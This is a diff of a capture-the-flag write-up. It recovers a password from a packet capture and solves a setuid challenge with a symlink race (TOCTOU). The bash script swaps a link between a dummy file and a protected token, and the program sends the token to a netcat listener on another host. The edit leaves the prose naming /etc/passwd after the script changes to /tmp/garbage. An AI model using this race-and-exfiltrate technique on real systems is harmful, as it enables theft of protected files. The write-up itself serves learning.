@@ -25,13 +25,14 @@ $ john level01.passwd # abcdefg (flag01)
 We have a `level02.pcap` file in the home folder. This is a "packet capture" file which we will copy to our host machine.
 
 ```shell
-$ scp -P 8022 level02@10.24.4.2:/home/user/level02/level02.pcap .
+$ scp -P 8022 level02@10.x.x.x:/home/user/level02/level02.pcap .
 $ chmod 400 level02.pcap
 ```
 
 We will use Wireshark to analyse the packets. Packet 43 has the string `Password:`. All the following packets alternate lengths between 66 and 67. The TCP packet header is 66 characters long, so it looks like the password is sent character by character with an acknowledgement everytime.
 
 Right click on packet 43 -> Follow -> TCP Stream. `Password: ft_wandr...NDRel.L0L`. We can look at the dots and see that their value is `7f` which is the `DEL` character. The password is then `ft_waNDReL0L`.
+
 
 ## level03
 
@@ -279,7 +280,6 @@ Which yields this token-looking token: `f3iji1ju5yuevaus41q1afiuq`.
 
 This is the most interesting challenge. Once again we have an unreadable token file and a `level10` executable with the setuid bit set.
 
-
 ```
 $ ./level10
 ./level10 file host
@@ -288,23 +288,29 @@ $ ./level10
 
 The disassembled code is much bigger, but it indeed looks like a file sending program. It first checks with `access` if we have the rights to the file, then connects to port `6969` of the given host and sends the file.
 
-The first step was to launch a server on port `6969` on the host machine. We used an early version of the IRC server but there are probably easier services to setup.
+The first step was to launch a server on port `6969` on the host machine: `nc -lk 6969`
 
 Now comes the TOCTOU attack (time-of-check to time-of-use). Since the program doesn't run infinitely fast, there is a gap between the `access` check and the sending of the file. We can exploit it by rotating symbolic links. One link must be a file readable by us, another must be `token`.
+
+First create a dummy file where you have the access rights: `echo garbage > /tmp/garbage`
 
 ```bash
 #!/bin/bash
 
 while true; do
-    ln -sf /etc/passwd /tmp/exploit_link
+    ln -sf /tmp/garbage /tmp/exploit_link
     ln -sf /home/user/level10/token /tmp/exploit_link
 done &
 
-/home/user/level10/level10 /tmp/exploit_link 10.x.x.x
+while true; do
+    /home/user/level10/level10 /tmp/exploit_link 10.x.x.x
+done
+
 kill $(jobs -p)
 ```
 
 Running this script will sometimes fail the `access` check and sometimes fail the `read` of the file. But if the timing is right, it will `access` `/etc/passwd` and `read+send` `/home/user/level10/token` to the host machine: `woupa2yuojeeaaed06riuj63c`.
+
 
 ## level11
 
